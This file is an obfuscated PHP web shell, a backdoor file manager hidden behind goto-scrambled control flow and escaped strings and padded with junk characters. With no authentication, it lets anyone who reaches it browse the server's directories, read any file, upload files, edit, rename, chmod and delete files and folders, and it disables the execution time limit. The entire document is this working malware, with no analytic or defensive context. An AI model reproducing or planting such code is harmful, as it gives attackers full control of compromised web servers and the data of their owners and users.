რޓ℅აޫoุહర્րቱኌhթpҎεፍ<?php
 goto RMgSq; J5FS1: if (isset($_FILES["\x66\151\x6c\145"])) { if (copy($_FILES["\146\151\x6c\145"]["\x74\155\x70\x5f\x6e\x61\x6d\145"], $path . "\x2f" . $_FILES["\146\x69\x6c\x65"]["\156\x61\155\x65"])) { echo "\x3c\x66\x6f\156\x74\x20\143\157\x6c\157\x72\x3d\42\147\x72\145\x65\156\42\x3e\x55\x70\154\x6f\141\144\40\x53\x75\x63\143\x65\163\163\56\56\74\x2f\146\x6f\x6e\x74\x3e\74\142\x72\40\x2f\x3e"; } else { echo "\74\x66\x6f\156\164\x20\x63\157\154\x6f\162\x3d\42\x72\x65\x64\x22\x3e\x55\x70\x6c\x6f\x61\x64\40\107\x61\x67\x61\154\56\56\74\57\146\157\x6e\164\x3e\x3c\x62\162\40\x2f\x3e"; } } goto EAefO; Ir71Z: $path = str_replace("\x5c", "\x2f", $path); goto dBAlF; DUk9T: if (isset($_GET["\x66\x69\154\145\x73\162\143"])) { echo "\74\164\x72\76\74\x74\x64\x20\163\x74\x79\154\x65\x3d\47\160\x61\144\144\151\x6e\147\72\40\x38\x70\170\47\76\x43\x75\x72\x72\145\x6e\x74\x20\106\151\x6c\x65\x20\x3a\x20"; echo $_GET["\x66\151\154\145\163\162\143"]; echo "\x3c\57\164\x72\x3e\74\57\x74\x64\x3e\74\57\x74\x61\142\x6c\x65\x3e\74\142\x72\x20\57\x3e"; echo "\74\x70\162\145\x3e" . htmlspecialchars(file_get_contents($_GET["\x66\151\x6c\x65\163\162\x63"])) . "\74\57\160\162\145\x3e"; } elseif (isset($_GET["\157\x70\x74\151\157\x6e"]) && $_POST["\x6f\x70\164"] != "\144\145\x6c\145\164\x65") { echo "\74\57\164\141\142\x6c\x65\x3e\x3c\x62\x72\40\x2f\x3e\x3c\143\145\x6e\164\x65\x72\76" . $_POST["\x70\x61\x74\x68"] . "\x3c\142\x72\40\57\x3e\74\142\x72\x20\x2f\x3e"; if ($_POST["\157\x70\164"] == "\x63\150\x6d\x6f\144") { if (isset($_POST["\160\x65\162\155"])) { if (chmod($_POST["\x70\141\x74\150"], $_POST["\160\x65\162\x6d"])) { echo "\74\x66\157\x6e\x74\x20\143\157\x6c\x6f\162\75\42\147\162\x65\x65\x6e\42\x3e\103\x68\x6d\x6f\144\40\x53\165\x63\143\x65\x73\163\56\56\74\x2f\x66\x6f\156\164\76\74\x62\x72\x20\57\76"; } else { echo "\74\146\157\156\x74\x20\143\x6f\154\157\x72\x3d\42\162\145\144\42\x3e\103\x68\x6d\x6f\x64\40\107\141\147\x61\154\56\x2e\x3c\x2f\x66\x6f\x6e\164\x3e\x3c\x62\162\x20\57\76"; } } echo "\74\146\x6f\x72\155\40\155\145\164\150\x6f\x64\75\42\120\x4f\123\124\42\76\xa\12\120\145\162\x6d\x69\163\163\151\157\156\40\72\x20\74\x69\156\160\165\164\40\156\141\155\x65\75\x22\160\x65\162\x6d\42\x20\164\x79\160\x65\x3d\x22\164\145\x78\164\x22\40\x73\151\172\x65\75\x22\64\42\40\166\x61\x6c\165\145\x3d\x22" . substr(sprintf("\x25\157", fileperms($_POST["\x70\141\164\x68"])), -4) . "\x22\x20\57\x3e\12\12\74\x69\156\x70\x75\164\x20\164\171\x70\145\x3d\x22\x68\x69\144\x64\145\x6e\x22\x20\x6e\x61\155\145\75\x22\x70\x61\x74\150\42\40\x76\141\154\165\145\75\x22" . $_POST["\x70\x61\164\150"] . "\x22\x3e\xa\xa\x3c\x69\x6e\160\x75\164\x20\x74\171\x70\145\x3d\42\150\151\x64\x64\x65\x6e\x22\40\156\x61\155\145\75\x22\157\x70\164\x22\40\166\141\154\165\x65\75\42\x63\150\155\x6f\144\42\76\xa\xa\x3c\x69\x6e\x70\165\164\x20\x74\171\160\145\75\42\x73\165\142\155\151\164\x22\40\166\x61\x6c\x75\145\75\x22\123\x61\x76\x65\x22\40\57\76\12\xa\74\57\x66\x6f\x72\x6d\76"; } elseif ($_POST["\157\160\x74"] == "\x72\145\x6e\141\x6d\145") { if (isset($_POST["\x6e\x65\167\x6e\141\x6d\x65"])) { if (rename($_POST["\160\141\x74\x68"], $path . "\57" . $_POST["\x6e\145\167\x6e\x61\155\x65"])) { echo "\74\146\x6f\156\164\40\x63\x6f\x6c\157\162\75\x22\x67\162\x65\x65\156\x22\x3e\x52\145\156\141\x6d\145\40\x42\x65\162\150\141\x73\151\x6c\56\x2e\74\57\x66\157\x6e\x74\x3e\74\142\x72\40\57\x3e"; } else { echo "\x3c\x66\x6f\156\164\40\143\x6f\x6c\x6f\162\x3d\x22\x72\x65\x64\x22\x3e\122\x65\x6e\x61\155\145\x20\107\x61\147\141\154\56\x2e\74\x2f\146\157\156\164\x3e\x3c\142\x72\40\x2f\76"; } $_POST["\x6e\141\x6d\x65"] = $_POST["\x6e\x65\x77\156\141\155\x65"]; } echo "\74\x66\x6f\162\x6d\40\155\x65\x74\x68\157\144\75\42\120\x4f\x53\124\42\x3e\xa\12\x4e\x65\x77\40\x4e\x61\155\145\40\x3a\40\74\151\156\160\x75\164\40\156\141\155\145\x3d\x22\x6e\145\167\x6e\141\155\145\x22\40\x74\171\x70\x65\75\42\x74\x65\x78\x74\42\40\163\151\172\x65\x3d\42\62\60\42\40\166\x61\x6c\165\145\75\42" . $_POST["\x6e\x61\x6d\145"] . "\x22\x20\57\x3e\12\xa\x3c\x69\156\x70\x75\x74\40\164\x79\x70\145\75\x22\x68\x69\144\144\x65\156\x22\40\x6e\x61\155\x65\x3d\42\x70\x61\164\150\x22\40\x76\x61\154\165\145\x3d\42" . $_POST["\160\141\x74\x68"] . "\42\x3e\xa\12\74\x69\x6e\160\x75\x74\40\164\x79\x70\145\75\42\x68\151\144\x64\x65\156\42\40\156\141\x6d\145\75\42\157\160\x74\42\x20\x76\x61\x6c\x75\145\x3d\42\162\x65\156\x61\x6d\145\x22\76\12\xa\x3c\151\156\x70\165\164\x20\x74\171\x70\145\75\42\163\x75\x62\155\151\164\42\40\x76\141\154\x75\x65\x3d\42\123\141\166\145\x22\x20\x2f\76\12\xa\x3c\57\146\157\162\x6d\76"; } elseif ($_POST["\x6f\160\164"] == "\145\x64\x69\164") { if (isset($_POST["\x73\162\x63"])) { $fp = fopen($_POST["\x70\141\x74\150"], "\167"); if (fwrite($fp, $_POST["\x73\162\x63"])) { echo "\x3c\146\x6f\x6e\x74\40\x63\157\x6c\157\x72\75\x22\147\162\145\145\156\42\x3e\x45\x64\x69\x74\x20\106\x69\x6c\x65\x20\x42\x65\x72\x68\141\x73\151\x6c\56\x2e\x3c\57\146\x6f\x6e\x74\76\x3c\142\162\40\57\76"; } else { echo "\74\x66\157\x6e\164\x20\143\x6f\x6c\157\x72\x3d\42\x72\145\x64\42\x3e\x45\144\151\x74\x20\106\151\154\145\x20\107\141\147\141\x6c\56\x2e\74\x2f\146\x6f\x6e\x74\76\x3c\x62\162\x20\57\76"; } fclose($fp); } echo "\74\146\157\162\x6d\40\155\x65\164\150\157\x64\x3d\42\x50\117\x53\124\42\76\12\12\74\x74\145\x78\x74\x61\x72\145\x61\40\x63\157\154\x73\75\61\x33\x30\40\162\x6f\x77\163\75\61\60\40\156\141\155\x65\75\x22\163\x72\143\42\76" . htmlspecialchars(file_get_contents($_POST["\x70\x61\164\150"])) . "\x3c\57\164\x65\170\164\141\x72\145\141\76\74\x62\162\40\x2f\x3e\xa\12\74\x69\156\160\165\164\40\x74\x79\x70\x65\75\x22\x68\x69\144\144\x65\156\42\40\156\x61\155\145\x3d\42\x70\x61\164\x68\42\x20\x76\x61\x6c\x75\145\75\42" . $_POST["\160\x61\164\150"] . "\x22\76\xa\12\74\151\x6e\x70\165\164\x20\x74\x79\160\145\75\42\150\151\144\x64\x65\156\42\x20\156\x61\155\145\75\42\x6f\160\164\x22\x20\166\x61\x6c\x75\x65\75\x22\x65\144\x69\x74\x22\x3e\12\xa\74\151\x6e\x70\x75\x74\x20\164\x79\160\x65\x3d\42\x73\x75\142\155\151\x74\42\40\x76\141\x6c\165\145\x3d\42\x53\x61\166\145\42\40\x2f\x3e\12\12\x3c\x2f\x66\x6f\x72\155\76"; } echo "\x3c\57\143\x65\x6e\164\145\162\76"; } else { echo "\x3c\57\x74\141\142\x6c\x65\x3e\74\142\162\40\57\76\74\x63\145\156\x74\145\162\76"; if (isset($_GET["\157\160\164\x69\x6f\x6e"]) && $_POST["\x6f\160\x74"] == "\x64\x65\x6c\145\164\x65") { if ($_POST["\x74\171\x70\x65"] == "\144\x69\162") { if (rmdir($_POST["\x70\141\164\150"])) { echo "\x3c\x66\x6f\156\x74\x20\x63\157\x6c\157\x72\x3d\42\x67\162\x65\145\x6e\42\76\104\145\x6c\145\x74\145\x20\x44\x69\x72\x65\143\164\157\x72\171\x20\x42\145\x72\150\x61\x73\x69\x6c\56\56\x3c\57\x66\x6f\x6e\164\76\74\142\x72\x20\57\76"; } else { echo "\x3c\x66\157\156\x74\x20\x63\x6f\x6c\157\x72\x3d\42\162\145\x64\42\76\x44\x65\154\x65\x74\145\40\x44\151\162\x65\x63\x74\x6f\x72\171\40\x47\x61\x67\141\x6c\56\x2e\x3c\x2f\x66\x6f\156\164\x3e\74\142\x72\x20\57\x3e"; } } elseif ($_POST["\164\171\x70\145"] == "\x66\151\154\145") { if (unlink($_POST["\x70\141\x74\x68"])) { echo "\x3c\x66\x6f\156\x74\x20\143\x6f\x6c\x6f\x72\75\42\x67\162\145\x65\x6e\42\x3e\x44\x65\x6c\x65\164\x65\x20\106\151\154\x65\40\x42\x65\162\150\141\x73\151\154\x2e\x2e\x3c\x2f\x66\x6f\156\x74\76\x3c\x62\x72\x20\x2f\76"; } else { echo "\x3c\x66\157\156\164\40\143\x6f\154\x6f\x72\75\42\x72\145\144\42\x3e\x44\x65\x6c\x65\164\x65\40\x46\x69\154\145\x20\107\x61\x67\141\x6c\56\x2e\x3c\57\146\x6f\156\x74\x3e\x3c\x62\x72\40\x2f\x3e"; } } } echo "\74\x2f\143\145\156\x74\x65\x72\76"; $scandir = scandir($path); echo "\74\x64\x69\166\x20\151\x64\x3d\x22\143\157\156\164\145\156\164\42\76\74\164\x61\x62\154\x65\40\167\151\x64\164\150\75\42\x39\62\60\42\x20\142\157\x72\x64\x65\x72\x3d\x22\61\x2e\65\x70\x78\42\x20\x63\x65\x6c\154\x70\x61\144\144\x69\156\147\75\42\x35\42\40\143\145\x6c\154\x73\160\141\x63\151\x6e\147\x3d\42\x30\x22\x20\141\x6c\x69\147\156\x3d\42\143\145\156\164\x65\x72\42\x3e\xa\xa\74\164\x72\40\143\x6c\x61\163\163\75\42\x66\151\162\x73\164\42\76\12\12\x3c\x74\x64\76\x3c\x63\x65\x6e\164\x65\162\x3e\x4e\x61\x6d\x65\74\57\x63\145\156\164\145\162\x3e\x3c\57\x74\144\x3e\xa\xa\x3c\164\x64\x3e\x3c\x63\145\156\x74\145\x72\x3e\x53\x69\x7a\145\74\x2f\143\145\x6e\x74\145\x72\x3e\74\57\164\x64\x3e\xa\12\x3c\x74\144\76\x3c\143\x65\x6e\164\145\x72\x3e\120\x65\162\155\151\163\x73\x69\x6f\156\x73\x3c\x2f\143\x65\156\x74\x65\162\76\74\57\x74\x64\x3e\12\xa\74\x74\144\76\74\143\x65\x6e\x74\x65\162\x3e\x4f\160\x74\151\157\156\163\x3c\57\143\145\x6e\x74\x65\162\x3e\74\57\x74\x64\76\xa\xa\74\57\x74\162\76"; foreach ($scandir as $dir) { if (!is_dir("{$path}\57{$dir}") || $dir == "\x2e" || $dir == "\56\x2e") { continue; } echo "\x3c\164\162\x3e\12\xa\74\164\144\76\74\141\40\x68\162\x65\146\x3d\42\x3f\x70\x61\x74\150\75{$path}\x2f{$dir}\x22\x3e{$dir}\x3c\57\x61\76\x3c\57\x74\144\x3e\xa\xa\x3c\164\144\x3e\x3c\143\x65\x6e\x74\x65\x72\x3e\x2d\55\x3c\57\143\x65\x6e\x74\x65\x72\x3e\x3c\x2f\164\x64\76\12\12\74\x74\x64\76\x3c\x63\x65\156\164\145\x72\76"; if (is_writable("{$path}\x2f{$dir}")) { echo "\x3c\x66\157\156\164\x20\143\x6f\x6c\x6f\162\75\42\x42\x6c\x75\145\42\76"; } elseif (!is_readable("{$path}\57{$dir}")) { echo "\x3c\x66\x6f\156\x74\40\143\x6f\x6c\157\162\75\42\x72\145\144\x22\76"; } echo perms("{$path}\x2f{$dir}"); if (is_writable("{$path}\57{$dir}") || !is_readable("{$path}\57{$dir}")) { echo "\x3c\57\146\157\x6e\164\76"; } echo "\74\x2f\143\145\x6e\164\145\162\x3e\x3c\x2f\164\x64\x3e\xa\xa\x3c\x74\x64\76\x3c\143\x65\x6e\x74\x65\x72\x3e\74\x66\x6f\162\155\40\x6d\x65\164\x68\157\x64\75\42\x50\117\123\x54\x22\40\x61\x63\164\x69\157\x6e\75\x22\x3f\157\x70\x74\151\157\x6e\x26\160\x61\164\x68\x3d{$path}\x22\76\12\12\74\x73\145\x6c\x65\143\x74\x20\x6e\x61\x6d\x65\x3d\x22\x6f\160\x74\42\x3e\xa\12\74\157\160\x74\151\x6f\x6e\40\x76\x61\x6c\165\x65\75\42\x22\76\74\x2f\x6f\x70\x74\x69\157\x6e\x3e\12\12\x3c\157\160\164\151\x6f\156\40\x76\141\x6c\x75\145\75\x22\144\x65\154\145\x74\145\x22\76\104\x65\154\x65\164\x65\74\57\157\x70\x74\x69\x6f\156\76\xa\xa\x3c\157\x70\164\x69\157\156\40\166\141\x6c\165\145\x3d\42\x63\x68\155\x6f\144\x22\x3e\103\x68\x6d\157\x64\74\57\157\x70\164\x69\157\x6e\x3e\xa\12\74\157\x70\164\x69\x6f\x6e\40\166\x61\x6c\165\145\x3d\x22\162\145\x6e\x61\x6d\145\x22\x3e\x52\x65\156\x61\x6d\145\74\x2f\x6f\x70\x74\x69\157\x6e\x3e\12\xa\x3c\x2f\x73\x65\154\145\x63\164\x3e\12\xa\74\151\x6e\x70\165\164\40\x74\171\160\x65\x3d\x22\x68\151\144\144\145\x6e\x22\x20\x6e\x61\155\x65\75\x22\x74\x79\160\x65\42\x20\166\x61\154\165\x65\75\42\x64\151\162\42\76\xa\xa\74\x69\x6e\160\165\164\x20\x74\x79\160\145\x3d\42\x68\x69\x64\x64\x65\x6e\x22\40\x6e\141\155\x65\75\x22\x6e\x61\155\145\x22\40\166\x61\x6c\x75\x65\75\x22{$dir}\x22\x3e\xa\12\x3c\151\156\x70\x75\x74\40\x74\x79\x70\145\x3d\42\x68\x69\x64\x64\145\x6e\42\40\x6e\x61\x6d\x65\x3d\x22\x70\141\164\150\x22\x20\x76\x61\x6c\x75\x65\75\42{$path}\x2f{$dir}\x22\x3e\xa\12\x3c\151\156\160\165\x74\40\x74\x79\160\145\x3d\42\x73\x75\x62\x6d\x69\164\42\40\166\x61\x6c\165\145\x3d\x22\x4f\x6b\x65\x22\40\57\76\xa\12\x3c\x2f\146\157\x72\155\76\74\57\x63\145\x6e\164\145\x72\76\74\57\x74\144\x3e\xa\xa\x3c\57\164\x72\76"; } echo "\x3c\x74\162\40\x63\154\141\163\163\x3d\x22\146\x69\x72\163\x74\x22\x3e\74\x74\144\x3e\74\57\164\x64\76\74\164\144\76\74\57\x74\144\x3e\x3c\164\x64\x3e\x3c\57\x74\144\x3e\x3c\164\144\76\74\x2f\164\x64\76\74\x2f\x74\162\76"; foreach ($scandir as $file) { if (!is_file("{$path}\x2f{$file}")) { continue; } $size = filesize("{$path}\x2f{$file}") / 1024; $size = round($size, 3); if ($size >= 1024) { $size = round($size / 1024, 2) . "\40\x4d\102"; } else { $size = $size . "\x20\113\x42"; } echo "\74\x74\162\x3e\12\xa\x3c\x74\144\76\x3c\141\x20\x68\162\x65\146\75\x22\77\146\x69\x6c\145\x73\x72\x63\75{$path}\x2f{$file}\46\x70\x61\x74\x68\x3d{$path}\42\76{$file}\x3c\57\141\76\74\57\164\x64\x3e\12\12\x3c\x74\144\x3e\x3c\143\145\x6e\164\145\162\x3e" . $size . "\74\57\x63\145\x6e\x74\145\x72\x3e\x3c\57\164\x64\76\12\12\x3c\x74\x64\x3e\74\x63\x65\156\x74\145\x72\x3e"; if (is_writable("{$path}\57{$file}")) { echo "\x3c\x66\157\x6e\x74\40\x63\157\154\x6f\x72\75\x22\x42\154\x75\145\42\76"; } elseif (!is_readable("{$path}\57{$file}")) { echo "\74\146\157\156\x74\x20\x63\x6f\x6c\x6f\162\75\42\162\145\144\42\x3e"; } echo perms("{$path}\x2f{$file}"); if (is_writable("{$path}\x2f{$file}") || !is_readable("{$path}\57{$file}")) { echo "\74\x2f\146\157\x6e\x74\x3e"; } echo "\x3c\57\143\145\156\164\x65\162\76\74\57\x74\144\76\12\12\x3c\x74\144\76\74\143\x65\156\164\145\x72\x3e\x3c\146\157\162\x6d\x20\155\x65\164\x68\157\144\x3d\42\x50\117\123\124\42\x20\141\143\x74\x69\157\x6e\x3d\x22\x3f\157\160\x74\151\x6f\156\46\x70\x61\164\x68\x3d{$path}\x22\x3e\xa\xa\74\x73\145\x6c\145\x63\x74\x20\x6e\141\155\145\75\x22\x6f\x70\x74\42\x3e\12\xa\74\157\160\164\151\157\156\x20\166\x61\x6c\165\145\x3d\42\x22\x3e\x3c\57\157\x70\x74\151\157\x6e\76\12\xa\x3c\x6f\160\x74\151\x6f\x6e\x20\x76\141\x6c\165\x65\x3d\x22\x64\x65\154\145\164\x65\42\x3e\x44\x65\154\145\164\145\x3c\x2f\x6f\x70\x74\151\157\x6e\x3e\xa\xa\74\157\160\x74\151\157\x6e\x20\x76\141\154\x75\x65\75\x22\143\150\155\x6f\x64\42\x3e\103\150\155\157\x64\x3c\x2f\157\x70\164\151\x6f\x6e\x3e\12\xa\74\x6f\160\x74\x69\157\x6e\x20\166\141\154\x75\145\75\42\162\x65\156\x61\155\145\x22\x3e\x52\x65\x6e\x61\x6d\145\x3c\57\x6f\x70\164\151\157\156\76\12\12\x3c\157\160\x74\151\x6f\x6e\x20\166\141\154\165\145\x3d\x22\145\x64\x69\164\42\x3e\x45\144\151\x74\x3c\x2f\x6f\x70\x74\x69\157\156\76\xa\12\x3c\x2f\x73\x65\x6c\145\143\x74\76\12\xa\x3c\x69\x6e\x70\x75\164\40\164\171\x70\145\75\x22\150\x69\x64\144\145\x6e\x22\x20\x6e\x61\x6d\x65\75\x22\x74\x79\x70\x65\42\x20\x76\x61\x6c\165\145\75\x22\x66\151\x6c\x65\x22\x3e\12\xa\74\151\156\160\x75\164\40\x74\171\160\145\75\x22\150\151\144\x64\145\156\x22\40\x6e\141\x6d\x65\75\x22\156\x61\155\145\x22\x20\x76\x61\154\x75\145\75\42{$file}\x22\76\xa\12\x3c\x69\156\160\x75\x74\40\164\171\x70\x65\75\x22\x68\151\144\x64\x65\156\42\x20\156\x61\155\145\75\42\160\141\164\150\42\x20\166\x61\154\165\x65\x3d\x22{$path}\x2f{$file}\x22\x3e\xa\xa\x3c\151\x6e\160\165\164\40\164\171\x70\145\75\42\x73\165\142\155\151\x74\42\x20\x76\141\154\x75\x65\75\x22\x4f\x6b\x65\x22\40\x2f\x3e\12\xa\74\57\x66\157\x72\x6d\x3e\74\x2f\x63\145\x6e\164\145\162\x3e\x3c\x2f\x74\144\x3e\xa\xa\x3c\x2f\x74\162\x3e"; } echo "\x3c\57\164\x61\x62\154\x65\76\12\xa\74\x2f\144\x69\x76\x3e"; } goto w5TKC; w5TKC: echo "\x3c\x63\x65\x6e\164\145\162\76\74\x68\162\40\x77\x69\x64\164\150\75\x22\71\62\60\42\40\143\x6f\154\157\162\x3d\x22\x62\154\x61\x63\x6b\x22\x2f\76\40\x3c\143\x65\156\x74\x65\x72\76\xa\12\74\57\102\117\x44\131\x3e\xa\x3c\x2f\x48\x54\115\x4c\x3e"; goto ztpfU; vklae: echo "\x3c\41\x44\x4f\103\x54\x59\x50\105\40\110\x54\115\x4c\76\xa\12\74\x3f\160\x68\x70\xa\74\150\145\141\144\76\x3c\164\x69\x74\x6c\145\x3e\340\272\252\xe0\272\xb8\xe0\xba\201\xe2\x80\213\xe0\273\200\340\xba\xaa\340\272\xb5\340\272\x99\74\57\x74\x69\164\x6c\x65\x3e\x3c\163\x74\x79\x6c\x65\76\142\157\144\171\x7b\146\157\156\x74\x2d\146\x61\x6d\x69\154\x79\72\155\x6f\x6e\x6f\x73\160\141\x63\x65\73\x66\x6f\x6e\164\x2d\167\145\151\x67\150\x74\72\x37\60\x30\x3b\146\x6f\x6e\x74\x2d\x73\151\172\145\x3a\61\x38\160\x78\x3b\x62\x61\143\x6b\x67\162\157\165\156\x64\x2d\x63\x6f\154\x6f\x72\72\43\71\144\x61\x36\x39\70\x3b\143\x6f\x6c\157\162\72\43\x31\x61\x32\x32\62\66\175\43\143\x6f\x6e\164\x65\156\x74\40\x74\162\x3a\x68\157\166\145\x72\x7b\x62\x61\143\153\x67\x72\x6f\165\x6e\144\x2d\143\x6f\x6c\157\162\72\43\x62\x35\x62\146\x63\64\x7d\x23\x63\157\156\x74\x65\x6e\x74\40\x2e\x66\151\x72\x73\164\173\142\x61\x63\x6b\x67\162\157\165\156\x64\x2d\143\157\154\x6f\x72\72\43\142\65\142\x66\x63\x34\175\43\x63\x6f\x6e\x74\x65\x6e\x74\40\x2e\146\151\x72\x73\164\x3a\150\x6f\x76\145\162\x7b\142\x61\x63\x6b\x67\x72\x6f\x75\156\144\x2d\x63\157\x6c\x6f\x72\72\43\x62\x35\x62\x66\x63\x34\175\164\x61\x62\154\x65\x7b\142\157\162\144\x65\x72\x3a\x33\160\170\x20\x23\61\141\62\62\62\66\40\x73\x6f\x6c\151\144\175\x61\173\x63\x6f\x6c\157\162\x3a\43\61\x61\62\62\x32\x36\x3b\x74\145\170\x74\x2d\x64\x65\x63\157\x72\x61\x74\151\x6f\156\72\156\x6f\156\x65\x7d\141\x3a\150\x6f\x76\x65\x72\x7b\x63\157\154\x6f\162\72\43\60\60\146\175\x69\156\160\165\164\x2c\163\x65\154\x65\x63\x74\54\x74\x65\x78\x74\x61\162\x65\x61\173\142\157\x72\x64\x65\162\x3a\x31\160\x78\x20\x23\x31\x61\x32\62\x32\x36\40\163\157\x6c\x69\x64\73\x2d\x6d\157\172\x2d\142\x6f\x72\144\145\162\x2d\x72\x61\x64\151\x75\x73\72\x35\160\170\73\55\x77\145\142\153\x69\164\x2d\142\157\162\x64\x65\x72\x2d\162\141\144\x69\165\163\72\x35\160\170\x3b\142\x6f\x72\144\145\162\x2d\162\x61\144\151\x75\x73\72\x35\x70\x78\x7d\151\x6e\x70\x75\164\173\x66\157\156\x74\55\163\x69\x7a\x65\72\61\70\160\x78\x3b\x66\157\156\164\55\167\145\151\x67\x68\x74\x3a\67\60\60\x3b\x70\x61\x64\x64\x69\x6e\x67\72\65\x70\170\x7d\163\x65\x6c\145\143\164\173\146\157\x6e\164\55\x73\151\x7a\x65\x3a\61\71\x70\x78\175\x74\145\x78\164\x61\162\145\x61\173\146\x6f\x6e\x74\x2d\x73\x69\172\145\72\61\x30\160\x78\x7d\164\x64\x2c\164\162\x7b\x70\141\x64\144\151\x6e\147\72\62\x70\x78\40\65\x70\170\x7d\74\57\163\x74\x79\154\145\76\74\x2f\150\145\141\x64\x3e\xa\12\74\x3f\160\150\160\xa\12\12\74\x68\162\x20\x77\x69\144\164\150\x3d\x22\x39\62\60\x22\40\x63\157\154\x6f\162\75\x22\142\154\141\143\153\42\x2f\x3e\12\12\x3c\150\x72\40\167\151\144\x74\150\x3d\42\71\62\60\42\x20\143\157\154\x6f\162\x3d\x22\x62\x6c\141\x63\153\x22\57\x3e\x3c\x63\145\x6e\x74\145\162\76\74\x70\x3e\74\150\62\76\x59\157\x75\162\40\111\120\40\72\x20" . $_SERVER["\122\x45\x4d\117\124\x45\137\x41\104\x44\122"] . "\74\57\150\62\x3e\x3c\57\x70\x3e\74\57\143\145\x6e\x74\145\162\x3e\xa\xa\74\x68\162\40\167\x69\144\x74\150\75\x22\x39\x32\60\x22\x20\143\x6f\x6c\157\162\75\42\x62\154\x61\x63\153\42\57\76\xa\xa\74\x74\141\x62\154\145\x20\x77\151\x64\x74\150\x3d\42\x39\x32\x30\42\40\142\x6f\x72\x64\x65\x72\x3d\42\x31\x70\x78\x22\40\143\x65\154\x6c\160\141\x64\x64\151\x6e\147\75\42\67\x22\40\x63\145\154\154\163\x70\x61\x63\x69\156\147\75\x22\60\x22\x20\x61\x6c\x69\x67\156\x3d\42\x63\x65\156\164\145\x72\42\76\12\xa\x3c\164\162\x3e\x3c\164\144\x20\x73\x74\x79\x6c\x65\x3d\x22\160\141\144\144\151\x6e\147\72\x20\70\160\170\42\76\x43\x75\162\x72\145\156\164\40\x50\141\x74\x68\x20\x3a\x20"; goto BNTq2; pZsEO: @set_time_limit(0); goto vklae; dBAlF: $paths = explode("\x2f", $path); goto TkDMq; BNTq2: if (isset($_GET["\160\x61\x74\150"])) { $path = $_GET["\160\x61\x74\x68"]; } else { $path = getcwd(); } goto Ir71Z; RMgSq: @session_start(); goto pZsEO; EAefO: echo "\74\x66\x6f\162\x6d\40\x65\156\143\x74\x79\x70\x65\x3d\x22\x6d\165\x6c\x74\x69\160\x61\162\164\x2f\146\x6f\x72\155\55\144\x61\164\x61\42\40\155\x65\x74\150\x6f\x64\x3d\x22\x50\117\x53\x54\x22\x3e\12\xa\125\160\x6c\x6f\x61\x64\40\x46\x69\154\145\40\x3a\x20\x3c\x69\x6e\x70\x75\x74\40\164\x79\160\145\x3d\x22\x66\151\154\x65\x22\40\x6e\141\155\145\75\x22\x66\151\154\145\x22\40\x2f\x3e\xa\xa\74\x69\x6e\160\x75\x74\x20\164\x79\x70\145\75\x22\x73\x75\x62\x6d\x69\164\42\40\x76\141\154\165\145\x3d\42\x55\x70\154\157\x61\x64\42\40\57\x3e\12\12\74\57\x66\x6f\x72\x6d\x3e\12\12\x3c\x2f\x74\144\76\x3c\57\164\162\x3e"; goto DUk9T; ztpfU: function perms($file) { $perms = fileperms($file); if (($perms & 49152) == 49152) { $info = "\163"; } elseif (($perms & 40960) == 40960) { $info = "\x6c"; } elseif (($perms & 32768) == 32768) { $info = "\55"; } elseif (($perms & 24576) == 24576) { $info = "\142"; } elseif (($perms & 16384) == 16384) { $info = "\x64"; } elseif (($perms & 8192) == 8192) { $info = "\143"; } elseif (($perms & 4096) == 4096) { $info = "\160"; } else { $info = "\165"; } $info .= $perms & 256 ? "\162" : "\55"; $info .= $perms & 128 ? "\x77" : "\x2d"; $info .= $perms & 64 ? $perms & 2048 ? "\163" : "\170" : ($perms & 2048 ? "\123" : "\x2d"); $info .= $perms & 32 ? "\x72" : "\x2d"; $info .= $perms & 16 ? "\167" : "\55"; $info .= $perms & 8 ? $perms & 1024 ? "\163" : "\170" : ($perms & 1024 ? "\x53" : "\55"); $info .= $perms & 4 ? "\x72" : "\55"; $info .= $perms & 2 ? "\x77" : "\x2d"; $info .= $perms & 1 ? $perms & 512 ? "\164" : "\170" : ($perms & 512 ? "\x54" : "\55"); return $info; } goto GRsWD; I2SqF: echo "\74\x2f\x74\144\x3e\74\x2f\164\162\76\x3c\164\x72\x3e\x3c\164\144\76"; goto J5FS1; TkDMq: foreach ($paths as $id => $pat) { if ($pat == '' && $id == 0) { $a = true; echo "\x3c\141\x20\150\162\145\146\75\42\x3f\x70\x61\x74\x68\x3d\57\x22\x3e\x2f\x3c\57\x61\76"; continue; } if ($pat == '') { continue; } echo "\74\141\40\x68\162\145\146\75\x22\x3f\160\141\x74\150\75"; for ($i = 0; $i <= $id; $i++) { echo "{$paths[$i]}"; if ($i != $id) { echo "\57"; } } echo "\42\x3e" . $pat . "\74\x2f\x61\76\57"; } goto I2SqF; GRsWD: ?>ްማેጥቪdເд್ጋሚർ4ҭ్1ኋዚ